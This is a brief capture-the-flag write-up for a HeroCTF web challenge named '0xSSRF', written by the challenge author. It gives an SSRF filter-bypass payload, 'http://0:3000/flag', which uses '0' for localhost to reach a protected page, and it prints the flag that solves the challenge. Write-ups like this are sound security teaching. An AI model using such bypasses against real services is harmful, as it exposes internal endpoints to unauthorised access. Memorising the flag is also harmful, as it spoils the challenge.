# 0xSSRF

### Category

Web

### Description

Get the flag !

URL : http://challs.heroctf.fr:3000

Format : **Hero{flag}**<br>
Author : **xanhacks**

### Write up

The goal here is to open the **/flag** page. After looking around for SSRF payload, you can find this one.

```
Payload : http://0:3000/flag
```

### Flag

Hero{cl4ssic_SSRF_byP4pass_251094}